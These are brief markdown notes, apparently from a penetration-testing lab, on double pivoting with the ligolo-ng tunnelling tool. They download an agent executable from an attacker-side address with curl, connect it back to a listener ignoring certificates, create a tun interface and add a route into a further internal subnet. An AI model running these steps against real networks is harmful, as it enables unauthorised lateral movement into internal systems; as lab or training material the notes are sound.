- Install agent
```
curl http://172.16.8.120:8888/pivot/ligolo-ng/agent.exe -o agent.exe
``` 
- add listener on attacker machine
```
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
```
- connect agent
```
.\agent.exe -connect 172.16.8.120:11601 -ignore-cert
```
- Create new tunel
```
sudo ip tuntap add user rohaki mode tun ligolo_double
sudo ip link set ligolo_double up
```
- Start with specific tunnel
```
session 2
start --tun ligolo_double
```
- Add route
```
sudo ip route add 172.16.9.0/24 dev ligolo_double
```